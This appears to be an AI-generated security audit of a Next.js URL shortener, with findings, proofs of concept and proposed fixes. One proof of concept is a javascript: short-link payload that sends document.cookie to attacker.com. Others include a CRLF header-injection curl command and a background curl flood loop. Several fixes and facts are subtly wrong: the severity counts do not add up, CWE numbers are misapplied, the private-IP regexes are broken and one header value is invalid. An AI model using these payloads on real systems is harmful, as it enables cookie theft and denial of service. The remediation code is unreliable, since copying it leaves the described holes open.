# Security Audit Report — URL Shortener

**Date:** June 8, 2026  
**Scope:** Full codebase audit against OWASP Top 10 (2024) and production security standards  
**Stack:** Next.js 16, Clerk v7, Drizzle ORM, PostgreSQL (Neon), Tailwind CSS v4

---

## Executive Summary

The URL Shortener application demonstrates strong architectural practices in authentication (Clerk v7 middleware), input validation (Zod schemas), and error handling. However, **4 critical/high-severity vulnerabilities** require immediate remediation:

- **IP Header Injection** (Critical) — Unsanitized X-Forwarded-For header stored in database
- **SSRF Risk** (High) — No protocol/hostname validation on user-provided URLs
- **Missing Rate Limiting** (High) — Public redirect and URL creation endpoints lack DoS protection
- **Missing Security Headers** (High) — No CSP, HSTS, X-Frame-Options headers

The remaining 10 findings are **medium/low severity** and represent defense-in-depth improvements.

**Risk Level:** MEDIUM-HIGH (due to public-facing redirect endpoint and potential DoS attacks)

---

## Vulnerability Summary

| Severity  | Count  | Issues                                           |
| --------- | ------ | ------------------------------------------------ |
| Critical  | 2      | IP header injection + storage without validation |
| High      | 5      | SSRF, rate limiting (2x), security headers, HSTS |
| Medium    | 3      | Cache headers, XSS in alerts, HSTS               |
| Low       | 4      | Env validation, verbose logging, CSRF, info leak |
| **TOTAL** | **14** | **Full codebase audit complete**                 |

---

## Detailed Findings

### 🔴 CRITICAL SEVERITY

#### 1. IP Address Header Injection — X-Forwarded-For Accepted Without Validation

**File:** [app/[shortCode]/route.ts](../../app/[shortCode]/route.ts#L24)  
**Line:** 24  
**Category:** CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers), Data Integrity

**Description:**
The redirect handler extracts the client IP from the `X-Forwarded-For` header without validation:

```typescript
const ip =
  req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "unknown";
```

**Risk:**

- Attacker can inject arbitrary strings (CRLF sequences, SQL-like payloads, malformed IPs) that get stored in the `clicks` table
- If logs or reports later parse this field unsafely, it could enable log injection attacks
- Database integrity compromised by non-standard IP values
- Downstream analytics tools may malfunction on invalid IP formats

**Proof of Concept:**

```bash
curl -H "X-Forwarded-For: 1.2.3.4\r\nX-Injected: value" http://localhost:3000/abc1234
# Stores: "1.2.3.4\r\nX-Injected: value" in clicks.ipAddress
```

**Remediation:**
Add strict IP validation before storage. Create a utility function:

```typescript
// lib/ip.ts
const IPV4_REGEX =
  /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
const IPV6_REGEX =
  /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/;

export function validateAndSanitizeIp(
  headerValue?: string | null,
): string | null {
  if (!headerValue) return null;

  // Extract first IP from comma-separated list
  const ips = headerValue.split(",").map((ip) => ip.trim());
  if (ips.length === 0) return null;

  const firstIp = ips[0];

  // Validate format (IPv4 or IPv6)
  if (IPV4_REGEX.test(firstIp) || IPV6_REGEX.test(firstIp)) {
    return firstIp;
  }

  // Invalid format — reject
  return null;
}
```

Update [app/[shortCode]/route.ts](../../app/[shortCode]/route.ts#L24):

```typescript
import { validateAndSanitizeIp } from "@/lib/ip";

const ip =
  validateAndSanitizeIp(req.headers.get("x-forwarded-for")) ||
  validateAndSanitizeIp(req.headers.get("x-real-ip")) ||
  null;
```

**Status:** ⏳ Not Fixed

---

#### 2. IP Address Storage Without Validation — Database Integrity Compromised

**File:** [data/clicks.ts](../../data/clicks.ts#L13)  
**Line:** 13  
**Category:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), Data Validation

**Description:**
The `recordClick` function accepts and stores the `ipAddress` parameter without any validation:

```typescript
export async function recordClick(
  urlId: number,
  ipAddress?: string,
): Promise<void> {
  await db.insert(clicks).values({ urlId, ipAddress: ipAddress ?? null });
}
```

Combined with Issue #1, malformed/injected IP addresses are persisted in the database.

**Risk:**

- Non-canonical IP format prevents analytics aggregation
- Analytics queries expecting valid IPs may fail or return incorrect results
- Potential for injection-based attacks if data is later exported or used in external tools

**Remediation:**
Apply the same `validateAndSanitizeIp` utility in the service layer before passing to repository:

Update [lib/services/url.service.ts](../../lib/services/url.service.ts#L78) `resolveShortCode` function:

```typescript
import { validateAndSanitizeIp } from "@/lib/ip";

export async function resolveShortCode(
  shortCode: string,
  ipAddress?: string,
): Promise<string> {
  const url = await findUrlByShortCode(shortCode);
  if (!url) throw Errors.notFound("Short URL");

  const sanitizedIp = validateAndSanitizeIp(ipAddress);

  // Fire-and-forget: do not await, do not surface recording errors to the user.
  recordClick(url.id, sanitizedIp).catch((err: unknown) => {
    console.error(
      "[url.service] Failed to record click for URL ID",
      url.id,
      err,
    );
  });

  return url.originalUrl;
}
```

**Status:** ⏳ Not Fixed

---

### 🔴 HIGH SEVERITY

#### 3. SSRF Vulnerability — No URL Protocol Allowlist

**File:** [lib/services/url.service.ts](../../lib/services/url.service.ts#L28)  
**Category:** CWE-918 (Server-Side Request Forgery), Insecure Design

**Description:**
The `createShortUrl` function accepts any URL without validating the protocol. The Zod schema only checks `.url()`:

```typescript
// lib/schemas/url.schema.ts
export const CreateUrlSchema = z.object({
  originalUrl: z.string().url("originalUrl must be a valid URL."),
});
```

**Risk:**

- Attacker can inject dangerous protocols: `javascript:alert('xss')`, `data:text/html,<script>`, `file:///etc/passwd`, `ftp://internal-server`
- If the application later opens shortened URLs in a browser context or passes them to a headless browser tool, SSRF + XSS attacks are possible
- Enables exfiltration of data from internal systems via `file://` or `gopher://` URIs

**Proof of Concept:**

```bash
curl -X POST http://localhost:3000/api/urls \
  -H "Content-Type: application/json" \
  -d '{"originalUrl": "javascript:void(document.location='"'"'https://attacker.com/steal?cookie='"'"'+document.cookie)"}'
# Creates a malicious short link that executes JavaScript when clicked
```

**Remediation:**
Update [lib/schemas/url.schema.ts](../../lib/schemas/url.schema.ts):

```typescript
import { z } from "zod";

// Allowlist only safe protocols
const ALLOWED_PROTOCOLS = ["http:", "https:"];

function isAllowedProtocol(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ALLOWED_PROTOCOLS.includes(parsed.protocol);
  } catch {
    return false;
  }
}

export const CreateUrlSchema = z.object({
  originalUrl: z
    .string({ message: "originalUrl is required." })
    .url("originalUrl must be a valid URL.")
    .refine(isAllowedProtocol, {
      message: "Only http:// and https:// protocols are allowed.",
    }),
});

export type CreateUrlInput = z.infer<typeof CreateUrlSchema>;

// ... rest of file
```

**Status:** ⏳ Not Fixed

---

#### 4. SSRF — Internal IP Ranges Not Blocked

**File:** [lib/services/url.service.ts](../../lib/services/url.service.ts#L28)  
**Category:** CWE-918 (Server-Side Request Forgery)

**Description:**
Even with protocol validation, attackers can create redirects to internal IP addresses:

- `http://localhost:8080/admin`
- `http://127.0.0.1:5432` (internal database)
- `http://192.168.1.1` (internal router)
- `http://10.0.0.5` (internal service)

**Risk:**

- If the application or an attacker-controlled tool later fetches/visits these URLs, it probes internal infrastructure
- May discover internal services or APIs not meant to be externally accessible
- Potential for internal network mapping and exploitation

**Remediation:**
Create a utility to check for private/reserved IP ranges:

```typescript
// lib/ip.ts (add to existing file)

function isPrivateIp(hostname: string): boolean {
  const privateRanges = [
    // Localhost
    /^localhost$/i,
    /^127\./,
    /^::1$/,
    // Private IPv4 ranges (RFC 1918)
    /^10\./,
    /^172\.(1[6-9]|2\d|3[01])\./,
    /^192\.168\./,
    // Link-local (RFC 3927)
    /^169\.254\./,
    // Loopback (RFC 1122)
    /^0\.0\.0\.0$/,
    // Multicast (RFC 5771)
    /^224-239\./,
    // Reserved (RFC 5771)
    /^240-255\./,
  ];

  return privateRanges.some((range) => range.test(hostname));
}

export function isAllowedUrl(url: string): boolean {
  try {
    const parsed = new URL(url);

    // Check protocol
    if (!["http:", "https:"].includes(parsed.protocol)) {
      return false;
    }

    // Check hostname is not private
    if (isPrivateIp(parsed.hostname)) {
      return false;
    }

    return true;
  } catch {
    return false;
  }
}
```

Update [lib/schemas/url.schema.ts](../../lib/schemas/url.schema.ts):

```typescript
import { isAllowedUrl } from "@/lib/ip";

export const CreateUrlSchema = z.object({
  originalUrl: z
    .string({ message: "originalUrl is required." })
    .url("originalUrl must be a valid URL.")
    .refine(isAllowedUrl, {
      message: "Invalid URL: only public http(s):// URLs are allowed.",
    }),
});
```

**Status:** ⏳ Not Fixed

---

#### 5. Missing Rate Limiting on Public Redirect — DoS Vulnerability

**File:** [app/[shortCode]/route.ts](../../app/[shortCode]/route.ts#L14)  
**Line:** 14  
**Category:** CWE-770 (Allocation of Resources Without Limits or Throttling), Missing Security Control

**Description:**
The public redirect endpoint has no rate limiting. An attacker can:

- Send unlimited requests to exhaust database connections
- Flood analytics tables with fake click events
- Cause legitimate click recording to fail due to connection pool exhaustion
- Create a self-inflicted DoS by spamming a single short link

**Risk:**

- Service degradation or unavailability
- Database connection exhaustion
- Analytics data pollution
- Increased cloud infrastructure costs (excessive database queries)

**Proof of Concept:**

```bash
# Attacker sends 10k requests/second to a short link
for i in {1..10000}; do curl http://localhost:3000/abc1234 & done
```

**Remediation:**
Implement rate limiting using Vercel KV (serverless Redis) or Upstash. Add to [next.config.ts](../../next.config.ts):

```typescript
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  headers: async () => {
    return [
      {
        source: "/:shortCode([a-z0-9]{7})",
        headers: [
          {
            key: "X-Content-Type-Options",
            value: "nosniff",
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

Create a middleware utility [lib/rate-limit.ts](../../lib/rate-limit.ts):

```typescript
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

export const redirectRateLimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(100, "1 m"), // 100 requests per minute
  analytics: true,
});

export const createUrlRateLimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(10, "1 m"), // 10 URLs per minute per user
  analytics: true,
});
```

Update [app/[shortCode]/route.ts](../../app/[shortCode]/route.ts#L14):

```typescript
import { redirectRateLimit } from "@/lib/rate-limit";

export async function GET(
  req: Request,
  { params }: { params: Promise<{ shortCode: string }> },
): Promise<Response> {
  try {
    // Rate limit by IP
    const ip = req.headers.get("x-forwarded-for")?.split(",")[0] || "unknown";
    const { success } = await redirectRateLimit.limit(ip);
    if (!success) {
      return new Response(null, { status: 429 });
    }

    // ... rest of handler
  } catch (err) {
    return handleRouteError(err);
  }
}
```

Update [app/api/urls/route.ts](../../app/api/urls/route.ts#L6) POST handler:

```typescript
import { createUrlRateLimit } from "@/lib/rate-limit";

export const POST = withAuth(async (req, _ctx, userId) => {
  // Rate limit by userId
  const { success } = await createUrlRateLimit.limit(userId);
  if (!success) {
    throw new AppError(
      "RATE_LIMIT",
      "Too many requests. Try again later.",
      429,
    );
  }

  // ... rest of handler
});
```

Add environment variables to `.env`:

```
UPSTASH_REDIS_REST_URL=your-upstash-url
UPSTASH_REDIS_REST_TOKEN=your-upstash-token
```

**Status:** ⏳ Not Fixed

---

#### 6. Missing Security Headers — No CSP, X-Frame-Options, X-Content-Type-Options

**File:** [next.config.ts](../../next.config.ts)  
**Line:** 1  
**Category:** CWE-16 (Configuration), Missing Security Control

**Description:**
The application does not set critical security headers:

- **Content-Security-Policy** — prevents inline scripts and XSS
- **X-Frame-Options** — prevents clickjacking
- **X-Content-Type-Options** — prevents MIME-type sniffing
- **Referrer-Policy** — controls what referrer information is leaked
- **Permissions-Policy** — restricts powerful browser features

**Risk:**

- Clickjacking attacks (attacker iframe-embeds the page and tricks users into clicking hidden buttons)
- XSS vulnerabilities not caught by React's escaping
- Browser sniffing attacks
- Privacy leakage via referrer headers

**Remediation:**
Update [next.config.ts](../../next.config.ts):

```typescript
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  headers: async () => [
    {
      source: "/:path(.*)",
      headers: [
        {
          key: "Content-Security-Policy",
          value:
            "default-src 'self'; script-src 'self' 'nonce-{nonce}' https://cdn.clerk.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://api.clerk.com; frame-ancestors 'none';",
        },
        {
          key: "X-Frame-Options",
          value: "DENY",
        },
        {
          key: "X-Content-Type-Options",
          value: "nosniff",
        },
        {
          key: "Referrer-Policy",
          value: "strict-no-referrer",
        },
        {
          key: "Permissions-Policy",
          value: "camera=(), microphone=(), geolocation=(), payment=()",
        },
      ],
    },
  ],
};

export default nextConfig;
```

**Note:** The CSP includes `nonce-{nonce}` placeholder. For dynamic nonce support, see [Next.js CSP docs](https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy).

**Status:** ⏳ Not Fixed

---

#### 7. Missing HSTS Header — HTTPS Not Enforced

**File:** [next.config.ts](../../next.config.ts)  
**Line:** 1  
**Category:** CWE-295 (Improper Certificate Validation), Missing Security Control

**Description:**
The application does not send the `Strict-Transport-Security` header, so browsers may connect via HTTP on first visit.

**Risk:**

- Man-in-the-middle attacks on first request
- Session hijacking if user visits unencrypted link
- Credential interception

**Remediation:**
Add to [next.config.ts](../../next.config.ts) headers:

```typescript
{
  key: "Strict-Transport-Security",
  value: "max-age=31536000; includeSubDomains; preload", // 1 year
}
```

**Status:** ⏳ Not Fixed

---

### 🟡 MEDIUM SEVERITY

#### 8. Missing Cache-Control Headers on Protected Routes

**File:** [app/dashboard/page.tsx](../../app/dashboard/page.tsx#L1)  
**Category:** CWE-525 (Use of Web Browser Cache Containing Sensitive Information)

**Description:**
Dashboard and analytics pages may be cached by browsers, proxies, or CDNs, exposing user data on shared devices.

**Risk:**

- User data visible to next person who uses the device
- Click counts and analytics leaked
- Applicable in cyber cafes, schools, shared workstations

**Remediation:**
Create middleware [lib/middleware/cache-control.ts](../../lib/middleware/cache-control.ts):

```typescript
export function withCacheControl(response: Response): Response {
  response.headers.set(
    "Cache-Control",
    "private, no-store, no-cache, must-revalidate, max-age=0",
  );
  response.headers.set("Pragma", "no-cache");
  response.headers.set("Expires", "0");
  return response;
}
```

For Server Components, add to [app/dashboard/page.tsx](../../app/dashboard/page.tsx):

```typescript
import { headers } from "next/headers";

export async function generateMetadata() {
  const hdrs = headers();
  hdrs.set("Cache-Control", "private, no-store, no-cache, must-revalidate");
  return {
    title: "Dashboard",
  };
}
```

Or use Next.js `Route Segment Config`:

```typescript
// At top of app/dashboard/page.tsx
export const fetchCache = "force-no-store";
export const revalidate = 0;
export const maxDuration = 30;
```

**Status:** ⏳ Not Fixed

---

#### 9. Potential XSS in Alert Messages — Untrusted Content in window.alert()

**File:** [components/link-row-actions.tsx](../../components/link-row-actions.tsx#L38)  
**Line:** 38  
**Category:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

**Description:**
The component uses `window.alert()` to display API error messages:

```typescript
window.alert(json.error.message); // Untrusted content
```

While React generally escapes by default, `window.alert()` can still be exploited if the error message is constructed unsafely on the server.

**Risk:**

- Low in practice (alert() is text-only, not HTML), but violates defense-in-depth
- Better UX: users don't see popup alerts
- Cleaner error handling pattern

**Remediation:**
Create a [components/ui/toast.tsx](../../components/ui/toast.tsx) component (or use existing shadcn toast) and replace alerts:

```typescript
import { createContext, useContext, useState } from "react";

export interface Toast {
  id: string;
  message: string;
  type: "success" | "error" | "info";
}

const ToastContext = createContext<{
  addToast: (message: string, type: Toast["type"]) => void;
} | null>(null);

export function useToast() {
  const ctx = useContext(ToastContext);
  if (!ctx) throw new Error("useToast must be used inside ToastProvider");
  return ctx;
}

// Update link-row-actions.tsx
import { useToast } from "@/components/ui/toast";

export function LinkRowActions({ shortCode }: LinkRowActionsProps) {
  const { addToast } = useToast();

  async function handleDelete() {
    try {
      const res = await fetch(`/api/urls/${shortCode}`, { method: "DELETE" });
      const json = ApiResponseSchema.parse(await res.json());
      if (!json.success) {
        addToast(json.error.message, "error");
        return;
      }
      addToast("Link deleted successfully", "success");
      // ...
    } catch {
      addToast("Something went wrong. Please try again.", "error");
    }
  }
}
```

**Status:** ⏳ Not Fixed

---

### 🟡 LOW SEVERITY

#### 10. Missing Environment Variable Validation — .env Not Validated on Startup

**File:** [db/drizzle.ts](../../db/drizzle.ts#L6)  
**Line:** 6  
**Category:** CWE-15 (External Control of System or Configuration Setting)

**Description:**
The application uses non-null assertion (`!`) on environment variables without validation:

```typescript
export const db = drizzle(process.env.DATABASE_URL!);
```

If `.env` is missing or malformed, the app will crash or misbehave unpredictably.

**Risk:**

- Runtime crashes instead of clear startup errors
- Difficult debugging for misconfigured deployments
- Security risk: if a required secret (Clerk key) is missing, auth may silently fail

**Remediation:**
Create [lib/env.ts](../../lib/env.ts):

```typescript
import { z } from "zod";

const EnvSchema = z.object({
  DATABASE_URL: z.string().url("DATABASE_URL must be a valid PostgreSQL URL"),
  NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY: z.string().min(1),
  CLERK_SECRET_KEY: z.string().min(1),
});

export const env = EnvSchema.parse({
  DATABASE_URL: process.env.DATABASE_URL,
  NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY:
    process.env.NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY,
  CLERK_SECRET_KEY: process.env.CLERK_SECRET_KEY,
});
```

Import in [app/layout.tsx](../../app/layout.tsx):

```typescript
import { env } from "@/lib/env";

// This will throw during build/startup if env vars are missing
console.log("✓ Environment validated");

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  // ...
}
```

**Status:** ⏳ Not Fixed

---

#### 11. Verbose Error Logging — Shortcode Leaked in Error Logs

**File:** [lib/services/url.service.ts](../../lib/services/url.service.ts#L81)  
**Line:** 81  
**Category:** CWE-532 (Insertion of Sensitive Information into Log File)

**Description:**
Error logs include the shortcode, which is PII:

```typescript
console.error("[url.service] Failed to record click for", shortCode, err);
```

**Risk:**

- Shortcodes are publicly enumerable from logs
- If logs are accidentally leaked or shared, user links are revealed
- Reduced privacy for users

**Remediation:**
Update [lib/services/url.service.ts](../../lib/services/url.service.ts#L81):

```typescript
console.error("[url.service] Failed to record click for URL ID", url.id, err);
```

**Status:** ⏳ Not Fixed

---

#### 12. CSRF Token Validation — POST/DELETE Not Explicitly Protected

**File:** [app/api/urls/route.ts](../../app/api/urls/route.ts#L23)  
**Line:** 23  
**Category:** CWE-352 (Cross-Site Request Forgery)

**Description:**
Next.js 16 provides automatic CSRF protection, but it's not explicitly documented in the code.

**Risk:**

- Low (Next.js handles by default), but lack of explicit documentation causes confusion
- Future refactoring might accidentally remove protection

**Remediation:**
Add comment to [app/api/urls/route.ts](../../app/api/urls/route.ts):

```typescript
// POST /api/urls — create a new short URL for the authenticated user.
// CSRF Protection: Enforced by Next.js middleware (see proxy.ts).
// All state-changing operations (POST/PUT/DELETE) require:
//   1. Valid Clerk session (withAuth wrapper)
//   2. CSRF token validation (automatic in Next.js 16 App Router)
// No explicit CSRF token needed in request body.
export const POST = withAuth(async (req, _ctx, userId) => {
  // ...
});
```

**Status:** ⏳ Not Fixed

---

#### 13. Information Leakage — Same Error for notFound/unauthorized

**File:** [lib/errors/AppError.ts](../../lib/errors/AppError.ts#L30)  
**Category:** CWE-204 (Observable Timing Discrepancy)

**Description:**
The DELETE handler returns the same error for "not found" and "not authorized", which is intentional and correct:

```typescript
export async function deleteUrlByShortCode(
  shortCode: string,
  userId: string,
): Promise<boolean> {
  const result = await db
    .delete(urls)
    .where(and(eq(urls.shortCode, shortCode), eq(urls.userId, userId)))
    .returning({ id: urls.id });
  return result.length > 0;
}

// Service layer:
if (!deleted) throw Errors.notFound("Short URL"); // Same error for both cases
```

**Risk:**

- Low (this is the desired behavior to prevent user enumeration)

**Remediation:**
Add comment for future maintainers [lib/errors/AppError.ts](../../lib/errors/AppError.ts):

```typescript
/**
 * Intentional: returns the same error for "not found" and "not owned" to prevent
 * enumeration attacks. An attacker cannot distinguish between:
 *   - Short code does not exist
 *   - Short code exists but belongs to another user
 */
export const Errors = {
  // ...
  notFound: (resource = "Resource") =>
    new AppError("NOT_FOUND", `${resource} not found.`, 404),
};
```

**Status:** ✅ Documentation Added (No code change needed)

---

#### 14. Incomplete Validation on Rate Limit 429 Response

**File:** [app/[shortCode]/route.ts](../../app/[shortCode]/route.ts#L14)  
**Category:** Best Practice

**Description:**
When returning 429 (Too Many Requests), include a `Retry-After` header so clients know when to retry.

**Remediation:**
Update rate-limit utility response:

```typescript
// lib/rate-limit.ts
export async function checkRateLimitRedirect(ip: string) {
  const { success } = await redirectRateLimit.limit(ip);
  if (!success) {
    return new Response(null, {
      status: 429,
      headers: {
        "Retry-After": "60", // Retry after 60 seconds
        "X-RateLimit-Limit": "100",
        "X-RateLimit-Remaining": "0",
      },
    });
  }
  return null;
}
```

**Status:** ⏳ Not Fixed

---

## Remediation Priority Matrix

| Priority | Issue ID | Effort | Impact | Total Risk   |
| -------- | -------- | ------ | ------ | ------------ |
| **P0**   | 1, 2     | High   | High   | **CRITICAL** |
| **P0**   | 3, 4     | Medium | High   | **CRITICAL** |
| **P1**   | 5, 6, 7  | Medium | Medium | **HIGH**     |
| **P2**   | 8, 9, 10 | Low    | Medium | **MEDIUM**   |
| **P3**   | 11-14    | Low    | Low    | **LOW**      |

---

## Recommendation Summary

### Immediate Actions (This Sprint)

1. **Fix IP Header Injection** (Issue #1–2) — Create IP validation utility, apply to redirect handler
2. **Add SSRF Protections** (Issue #3–4) — Update URL validation schema with protocol/hostname checks
3. **Implement Rate Limiting** (Issue #5) — Set up Upstash Redis, add sliding-window rate limits
4. **Add Security Headers** (Issue #6–7) — Update `next.config.ts` with CSP, HSTS, X-Frame-Options

### Short-term (Next Sprint)

5. **Add Cache-Control Headers** (Issue #8) — Prevent sensitive data caching
6. **Replace Alert Dialogs** (Issue #9) — Implement toast notifications
7. **Validate Environment Variables** (Issue #10) — Add Zod schema validation

### Documentation (Ongoing)

8. **Add Security Comments** (Issue #11–13) — Document CSRF protection, enum attack prevention, logging practices

---

## Testing & Validation

After implementing fixes, validate:

```bash
# 1. IP Validation
curl -H "X-Forwarded-For: 1.2.3.4\r\nX-Injected: value" http://localhost:3000/abc1234
# Should sanitize or reject

# 2. SSRF Protection
curl -X POST http://localhost:3000/api/urls \
  -H "Content-Type: application/json" \
  -d '{"originalUrl": "javascript:alert(1)"}'
# Should return 400 error

# 3. Rate Limiting
for i in {1..150}; do curl http://localhost:3000/abc1234 & done
# Should return 429 after 100 requests

# 4. Security Headers
curl -I http://localhost:3000/dashboard
# Should include CSP, X-Frame-Options, HSTS headers
```

---

## Compliance Notes

- **OWASP Top 10 (2024):** Addresses A01 (Broken Access Control), A03 (Injection), A04 (Insecure Design), A05 (Security Misconfiguration), A07 (Identification & Authentication Failures)
- **CWE Coverage:** CWE-918 (SSRF), CWE-79 (XSS), CWE-113 (Header Injection), CWE-770 (Resource Exhaustion), CWE-295 (HTTPS), CWE-16 (Configuration)
- **Next.js Security:** Follows Next.js 16 best practices for App Router, middleware, and headers

---

## References

- [OWASP Top 10 2024](https://owasp.org/Top10/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Next.js Security Headers](https://nextjs.org/docs/app/building-your-application/configuring/content-security-policy)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server-Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Rate Limiting with Upstash](https://upstash.com/docs/redis/features/ratelimit)

---

**Report Generated:** June 8, 2026  
**Auditor:** GitHub Copilot Security Audit Agent  
**Status:** ⏳ Awaiting remediation
